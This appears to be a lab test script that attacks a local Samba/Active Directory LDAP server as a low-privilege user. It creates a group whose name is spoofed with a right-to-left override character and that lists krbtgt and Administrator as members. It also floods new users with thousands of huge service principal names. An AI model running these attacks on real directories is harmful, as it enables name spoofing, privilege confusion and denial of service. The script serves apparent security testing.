#!/bin/bash
# Run as root in the lab VM after live-provision.sh and live-eve.sh: eve writes values on objects she does not own (cycle 3 attacks).
# Usage: live-eve3.sh group | spns
set -uo pipefail
PASSWORD='Lab-Passw0rd!x'
BASE=DC=lab,DC=test
OU="OU=Helpdesk,$BASE"

add_as_eve() {
    ldbadd -H ldap://127.0.0.1 -U "eve%$PASSWORD" "$@"
}

if [ "$1" = group ]; then
    GROUP="CN=$(printf 'grp\xe2\x80\xaeevil'),$OU"
    {
        printf 'dn: %s\nobjectClass: group\n' "$GROUP"
        for name in krbtgt Administrator svc-roast nopre; do
            printf 'member: CN=%s,CN=Users,%s\n' "$name" "$BASE"
        done
        printf 'member: CN=srvdeleg,CN=Computers,%s\n' "$BASE"
    } | add_as_eve
    echo "eve group exit=$?"
else
    python3 - "$OU" "$PASSWORD" <<'PY'
import subprocess
import sys

ou, password = sys.argv[1], sys.argv[2]
for user in range(4):
    lines = ["dn: CN=spn%d,%s" % (user, ou), "objectClass: user"]
    lines += ["servicePrincipalName: h%d/%s%s" % (user, "x" * 10000, i) for i in range(1000)]
    done = subprocess.run(
        ["ldbadd", "-H", "ldap://127.0.0.1", "-U", "eve%" + password],
        input="\n".join(lines) + "\n",
        text=True,
        capture_output=True,
    )
    print("user", user, "exit", done.returncode, done.stderr.strip()[:200])
PY
fi
